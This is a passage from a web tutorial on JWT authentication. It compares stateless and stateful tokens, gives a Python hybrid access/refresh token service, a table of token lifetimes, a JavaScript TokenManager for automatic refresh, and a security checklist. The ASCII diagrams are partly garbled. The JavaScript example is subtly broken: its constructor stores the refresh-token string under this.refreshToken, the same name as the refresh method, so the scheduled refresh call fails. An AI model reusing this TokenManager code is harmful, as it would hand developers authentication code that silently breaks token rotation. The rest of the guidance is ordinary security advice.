<a id="__codelineno-37-28" name="__codelineno-37-28" href="#__codelineno-37-28"></a>                                                        
<a id="__codelineno-37-29" name="__codelineno-37-29" href="#__codelineno-37-29"></a>                                         
<a id="__codelineno-37-30" name="__codelineno-37-30" href="#__codelineno-37-30"></a>                         Is Revoked?                   
<a id="__codelineno-37-31" name="__codelineno-37-31" href="#__codelineno-37-31"></a>                                         
<a id="__codelineno-37-32" name="__codelineno-37-32" href="#__codelineno-37-32"></a>                                                        
<a id="__codelineno-37-33" name="__codelineno-37-33" href="#__codelineno-37-33"></a>                            Valid                     
<a id="__codelineno-37-34" name="__codelineno-37-34" href="#__codelineno-37-34"></a>                                                          
<a id="__codelineno-37-35" name="__codelineno-37-35" href="#__codelineno-37-35"></a>         4. Return Data                                  
<a id="__codelineno-37-36" name="__codelineno-37-36" href="#__codelineno-37-36"></a>       &lt;       
<a id="__codelineno-37-37" name="__codelineno-37-37" href="#__codelineno-37-37"></a>                                                          
<a id="__codelineno-37-38" name="__codelineno-37-38" href="#__codelineno-37-38"></a>                                                             
<a id="__codelineno-37-39" name="__codelineno-37-39" href="#__codelineno-37-39"></a>   Advantages:                                            
<a id="__codelineno-37-40" name="__codelineno-37-40" href="#__codelineno-37-40"></a>   Can revoke tokens instantly                             
<a id="__codelineno-37-41" name="__codelineno-37-41" href="#__codelineno-37-41"></a>   Logout works immediately                                
<a id="__codelineno-37-42" name="__codelineno-37-42" href="#__codelineno-37-42"></a>   Better security control                                 
<a id="__codelineno-37-43" name="__codelineno-37-43" href="#__codelineno-37-43"></a>                                                             
<a id="__codelineno-37-44" name="__codelineno-37-44" href="#__codelineno-37-44"></a>   Disadvantages:                                         
<a id="__codelineno-37-45" name="__codelineno-37-45" href="#__codelineno-37-45"></a>   Database lookup required (slower)                       
<a id="__codelineno-37-46" name="__codelineno-37-46" href="#__codelineno-37-46"></a>   Not truly stateless                                     
<a id="__codelineno-37-47" name="__codelineno-37-47" href="#__codelineno-37-47"></a>   Loses some scalability benefits                         
<a id="__codelineno-37-48" name="__codelineno-37-48" href="#__codelineno-37-48"></a>                                                             
<a id="__codelineno-37-49" name="__codelineno-37-49" href="#__codelineno-37-49"></a>
</code></pre></div>
<h3 id="comparison-stateless-vs-stateful-jwt">Comparison: Stateless vs Stateful JWT</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>              Stateless vs Stateful JWT                     
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>                     STATELESS          STATEFUL          
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a> Server Storage     None          Token blacklist     
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a> Database Lookup    No            Yes                 
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a> Revocation         Impossible    Instant             
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a> Scalability        Excellent     Good                
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a> Speed              Very Fast     Fast                
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a> Logout             Must wait     Immediate           
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a> Complexity         Simple        More complex        
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a> Security           Good          Better              
<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>
</code></pre></div>
<h3 id="best-practice-hybrid-stateless-approach">Best Practice: Hybrid Stateless Approach</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1">#  RECOMMENDED: Short-lived JWT + Refresh Token</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="k">class</span><span class="w"> </span><span class="nc">HybridJWTService</span><span class="p">:</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">access_token_ttl</span> <span class="o">=</span> <span class="mi">900</span>       <span class="c1"># 15 minutes (stateless)</span>
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">refresh_token_ttl</span> <span class="o">=</span> <span class="mi">604800</span>   <span class="c1"># 7 days (stateful)</span>
<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span> <span class="o">=</span> <span class="p">{}</span>          <span class="c1"># Store in Redis/DB</span>
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>        <span class="c1"># Short-lived access token (stateless)</span>
<a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>        <span class="n">access_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_jwt</span><span class="p">(</span>
<a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a>            <span class="n">token_type</span><span class="o">=</span><span class="s2">&quot;access&quot;</span><span class="p">,</span>
<a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>            <span class="n">ttl</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">access_token_ttl</span>
<a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a>        <span class="p">)</span>
<a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a>
<a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a>        <span class="c1"># Long-lived refresh token (stateful - stored server-side)</span>
<a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a>        <span class="n">refresh_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_jwt</span><span class="p">(</span>
<a id="__codelineno-39-18" name="__codelineno-39-18" href="#__codelineno-39-18"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-39-19" name="__codelineno-39-19" href="#__codelineno-39-19"></a>            <span class="n">token_type</span><span class="o">=</span><span class="s2">&quot;refresh&quot;</span><span class="p">,</span>
<a id="__codelineno-39-20" name="__codelineno-39-20" href="#__codelineno-39-20"></a>            <span class="n">ttl</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">refresh_token_ttl</span>
<a id="__codelineno-39-21" name="__codelineno-39-21" href="#__codelineno-39-21"></a>        <span class="p">)</span>
<a id="__codelineno-39-22" name="__codelineno-39-22" href="#__codelineno-39-22"></a>
<a id="__codelineno-39-23" name="__codelineno-39-23" href="#__codelineno-39-23"></a>        <span class="c1"># Store refresh token in database/Redis</span>
<a id="__codelineno-39-24" name="__codelineno-39-24" href="#__codelineno-39-24"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">[</span><span class="n">refresh_token</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-39-25" name="__codelineno-39-25" href="#__codelineno-39-25"></a>            <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-39-26" name="__codelineno-39-26" href="#__codelineno-39-26"></a>            <span class="s1">&#39;created_at&#39;</span><span class="p">:</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span>
<a id="__codelineno-39-27" name="__codelineno-39-27" href="#__codelineno-39-27"></a>            <span class="s1">&#39;last_used&#39;</span><span class="p">:</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
<a id="__codelineno-39-28" name="__codelineno-39-28" href="#__codelineno-39-28"></a>        <span class="p">}</span>
<a id="__codelineno-39-29" name="__codelineno-39-29" href="#__codelineno-39-29"></a>
<a id="__codelineno-39-30" name="__codelineno-39-30" href="#__codelineno-39-30"></a>        <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-39-31" name="__codelineno-39-31" href="#__codelineno-39-31"></a>            <span class="s1">&#39;access_token&#39;</span><span class="p">:</span> <span class="n">access_token</span><span class="p">,</span>   <span class="c1"># No DB lookup needed</span>
<a id="__codelineno-39-32" name="__codelineno-39-32" href="#__codelineno-39-32"></a>            <span class="s1">&#39;refresh_token&#39;</span><span class="p">:</span> <span class="n">refresh_token</span><span class="p">,</span>  <span class="c1"># DB lookup required</span>
<a id="__codelineno-39-33" name="__codelineno-39-33" href="#__codelineno-39-33"></a>            <span class="s1">&#39;expires_in&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">access_token_ttl</span>
<a id="__codelineno-39-34" name="__codelineno-39-34" href="#__codelineno-39-34"></a>        <span class="p">}</span>
<a id="__codelineno-39-35" name="__codelineno-39-35" href="#__codelineno-39-35"></a>
<a id="__codelineno-39-36" name="__codelineno-39-36" href="#__codelineno-39-36"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">logout</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">refresh_token</span><span class="p">):</span>
<a id="__codelineno-39-37" name="__codelineno-39-37" href="#__codelineno-39-37"></a>        <span class="c1"># Remove refresh token from storage</span>
<a id="__codelineno-39-38" name="__codelineno-39-38" href="#__codelineno-39-38"></a>        <span class="k">if</span> <span class="n">refresh_token</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">:</span>
<a id="__codelineno-39-39" name="__codelineno-39-39" href="#__codelineno-39-39"></a>            <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">[</span><span class="n">refresh_token</span><span class="p">]</span>
<a id="__codelineno-39-40" name="__codelineno-39-40" href="#__codelineno-39-40"></a>
<a id="__codelineno-39-41" name="__codelineno-39-41" href="#__codelineno-39-41"></a>        <span class="c1"># Access token will expire naturally (15 min max)</span>
<a id="__codelineno-39-42" name="__codelineno-39-42" href="#__codelineno-39-42"></a>        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
<a id="__codelineno-39-43" name="__codelineno-39-43" href="#__codelineno-39-43"></a>
<a id="__codelineno-39-44" name="__codelineno-39-44" href="#__codelineno-39-44"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">refresh_access_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">refresh_token</span><span class="p">):</span>
<a id="__codelineno-39-45" name="__codelineno-39-45" href="#__codelineno-39-45"></a>        <span class="c1"># Check if refresh token exists (stateful check)</span>
<a id="__codelineno-39-46" name="__codelineno-39-46" href="#__codelineno-39-46"></a>        <span class="k">if</span> <span class="n">refresh_token</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">:</span>
<a id="__codelineno-39-47" name="__codelineno-39-47" href="#__codelineno-39-47"></a>            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Invalid refresh token&quot;</span><span class="p">)</span>
<a id="__codelineno-39-48" name="__codelineno-39-48" href="#__codelineno-39-48"></a>
<a id="__codelineno-39-49" name="__codelineno-39-49" href="#__codelineno-39-49"></a>        <span class="c1"># Generate new access token (stateless)</span>
<a id="__codelineno-39-50" name="__codelineno-39-50" href="#__codelineno-39-50"></a>        <span class="n">user_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">[</span><span class="n">refresh_token</span><span class="p">][</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
<a id="__codelineno-39-51" name="__codelineno-39-51" href="#__codelineno-39-51"></a>        <span class="n">new_access_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_jwt</span><span class="p">(</span>
<a id="__codelineno-39-52" name="__codelineno-39-52" href="#__codelineno-39-52"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-39-53" name="__codelineno-39-53" href="#__codelineno-39-53"></a>            <span class="n">token_type</span><span class="o">=</span><span class="s2">&quot;access&quot;</span><span class="p">,</span>
<a id="__codelineno-39-54" name="__codelineno-39-54" href="#__codelineno-39-54"></a>            <span class="n">ttl</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">access_token_ttl</span>
<a id="__codelineno-39-55" name="__codelineno-39-55" href="#__codelineno-39-55"></a>        <span class="p">)</span>
<a id="__codelineno-39-56" name="__codelineno-39-56" href="#__codelineno-39-56"></a>
<a id="__codelineno-39-57" name="__codelineno-39-57" href="#__codelineno-39-57"></a>        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;access_token&#39;</span><span class="p">:</span> <span class="n">new_access_token</span><span class="p">}</span>
<a id="__codelineno-39-58" name="__codelineno-39-58" href="#__codelineno-39-58"></a>
<a id="__codelineno-39-59" name="__codelineno-39-59" href="#__codelineno-39-59"></a><span class="c1"># Benefits:</span>
<a id="__codelineno-39-60" name="__codelineno-39-60" href="#__codelineno-39-60"></a><span class="c1">#  Access token is stateless (99% of requests)</span>
<a id="__codelineno-39-61" name="__codelineno-39-61" href="#__codelineno-39-61"></a><span class="c1">#  Can revoke via refresh token invalidation</span>
<a id="__codelineno-39-62" name="__codelineno-39-62" href="#__codelineno-39-62"></a><span class="c1">#  Compromise window is only 15 minutes</span>
<a id="__codelineno-39-63" name="__codelineno-39-63" href="#__codelineno-39-63"></a><span class="c1">#  Scales well (most requests don&#39;t hit DB)</span>
</code></pre></div>
<hr />
<h2 id="best-practices-for-using-jwt">Best Practices for Using JWT</h2>
<h3 id="1-token-lifetime-strategy">1. Token Lifetime Strategy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>              Token Lifetime Recommendations                
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>                                                             
<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>  Application Type       Access Token    Refresh Token      
<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>                  
<a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>                                                             
<a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>  Web App (SPA)          15 minutes      7 days             
<a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>  Mobile App             30 minutes      30 days            
<a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>  Desktop App            60 minutes      90 days            
<a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>  API (M2M)              1 hour          No refresh         
<a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>  Banking/Finance        5 minutes       1 day              
<a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a>  Internal Tools         1 hour          30 days            
<a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a>  IoT Devices            6 hours         1 year             
<a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a>                                                             
<a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>
</code></pre></div>
<h3 id="2-token-rotation">2. Token Rotation</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1">//  Automatic token refresh before expiry</span>
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="kd">class</span><span class="w"> </span><span class="nx">TokenManager</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">accessToken</span><span class="p">,</span><span class="w"> </span><span class="nx">refreshToken</span><span class="p">,</span><span class="w"> </span><span class="nx">expiresIn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">accessToken</span><span class="p">;</span>
<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">refreshToken</span><span class="p">;</span>
<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">expiresAt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nx">expiresIn</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>
<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="w">        </span><span class="c1">// Refresh 5 minutes before expiry</span>
<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">scheduleRefresh</span><span class="p">();</span>
<a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>
<a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a><span class="w">    </span><span class="nx">scheduleRefresh</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">timeUntilExpiry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">expiresAt</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">refreshBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span><span class="w">  </span><span class="c1">// 5 minutes</span>
<a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">refreshTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">timeUntilExpiry</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">refreshBuffer</span><span class="p">;</span>
<a id="__codelineno-41-16" name="__codelineno-41-16" href="#__codelineno-41-16"></a>
<a id="__codelineno-41-17" name="__codelineno-41-17" href="#__codelineno-41-17"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">refreshTime</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-18" name="__codelineno-41-18" href="#__codelineno-41-18"></a><span class="w">            </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshToken</span><span class="p">(),</span><span class="w"> </span><span class="nx">refreshTime</span><span class="p">);</span>
<a id="__codelineno-41-19" name="__codelineno-41-19" href="#__codelineno-41-19"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-41-20" name="__codelineno-41-20" href="#__codelineno-41-20"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-41-21" name="__codelineno-41-21" href="#__codelineno-41-21"></a>
<a id="__codelineno-41-22" name="__codelineno-41-22" href="#__codelineno-41-22"></a><span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">refreshToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-23" name="__codelineno-41-23" href="#__codelineno-41-23"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-24" name="__codelineno-41-24" href="#__codelineno-41-24"></a><span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/refresh&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-25" name="__codelineno-41-25" href="#__codelineno-41-25"></a><span class="w">                </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<a id="__codelineno-41-26" name="__codelineno-41-26" href="#__codelineno-41-26"></a><span class="w">                </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-27" name="__codelineno-41-27" href="#__codelineno-41-27"></a><span class="w">                    </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span>
<a id="__codelineno-41-28" name="__codelineno-41-28" href="#__codelineno-41-28"></a><span class="w">                </span><span class="p">},</span>
<a id="__codelineno-41-29" name="__codelineno-41-29" href="#__codelineno-41-29"></a><span class="w">                </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<a id="__codelineno-41-30" name="__codelineno-41-30" href="#__codelineno-41-30"></a><span class="w">                    </span><span class="nx">refresh_token</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshToken</span>
<a id="__codelineno-41-31" name="__codelineno-41-31" href="#__codelineno-41-31"></a><span class="w">                </span><span class="p">})</span>
<a id="__codelineno-41-32" name="__codelineno-41-32" href="#__codelineno-41-32"></a><span class="w">            </span><span class="p">});</span>
<a id="__codelineno-41-33" name="__codelineno-41-33" href="#__codelineno-41-33"></a>
<a id="__codelineno-41-34" name="__codelineno-41-34" href="#__codelineno-41-34"></a><span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<a id="__codelineno-41-35" name="__codelineno-41-35" href="#__codelineno-41-35"></a>
<a id="__codelineno-41-36" name="__codelineno-41-36" href="#__codelineno-41-36"></a><span class="w">            </span><span class="c1">// Update tokens</span>
<a id="__codelineno-41-37" name="__codelineno-41-37" href="#__codelineno-41-37"></a><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">access_token</span><span class="p">;</span>
<a id="__codelineno-41-38" name="__codelineno-41-38" href="#__codelineno-41-38"></a><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">expiresAt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">expires_in</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<a id="__codelineno-41-39" name="__codelineno-41-39" href="#__codelineno-41-39"></a>
<a id="__codelineno-41-40" name="__codelineno-41-40" href="#__codelineno-41-40"></a><span class="w">            </span><span class="c1">// Schedule next refresh</span>
<a id="__codelineno-41-41" name="__codelineno-41-41" href="#__codelineno-41-41"></a><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">scheduleRefresh</span><span class="p">();</span>
<a id="__codelineno-41-42" name="__codelineno-41-42" href="#__codelineno-41-42"></a>
<a id="__codelineno-41-43" name="__codelineno-41-43" href="#__codelineno-41-43"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-41-44" name="__codelineno-41-44" href="#__codelineno-41-44"></a><span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Token refresh failed:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">error</span><span class="p">);</span>
<a id="__codelineno-41-45" name="__codelineno-41-45" href="#__codelineno-41-45"></a><span class="w">            </span><span class="c1">// Redirect to login</span>
<a id="__codelineno-41-46" name="__codelineno-41-46" href="#__codelineno-41-46"></a><span class="w">            </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/login&#39;</span><span class="p">;</span>
<a id="__codelineno-41-47" name="__codelineno-41-47" href="#__codelineno-41-47"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-41-48" name="__codelineno-41-48" href="#__codelineno-41-48"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-41-49" name="__codelineno-41-49" href="#__codelineno-41-49"></a><span class="p">}</span>
</code></pre></div>
<h3 id="3-security-checklist">3. Security Checklist</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a> JWT Security Best Practices Checklist:
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>Storage:
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>   Use HttpOnly cookies (not localStorage)
<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>   Set Secure flag (HTTPS only)
<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>   Set SameSite=Strict (CSRF protection)
<a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>   Set appropriate Domain and Path
<a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>
<a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a>Token Creation:
<a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>   Use strong signing algorithm (RS256 &gt; HS256)
<a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a>   Include &#39;iss&#39; (issuer) claim
<a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a>   Include &#39;aud&#39; (audience) claim
<a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>   Include &#39;exp&#39; (expiration) claim
<a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a>   Include &#39;jti&#39; (unique ID) for revocation
<a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a>   Use short expiration times (15 min)
<a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a>
<a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a>Token Validation:
<a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a>   Verify signature
<a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a>   Validate &#39;exp&#39; (not expired)
<a id="__codelineno-42-20" name="__codelineno-42-20" href="#__codelineno-42-20"></a>   Validate &#39;nbf&#39; (not before)
<a id="__codelineno-42-21" name="__codelineno-42-21" href="#__codelineno-42-21"></a>   Validate &#39;iss&#39; (trusted issuer)
<a id="__codelineno-42-22" name="__codelineno-42-22" href="#__codelineno-42-22"></a>   Validate &#39;aud&#39; (intended audience)
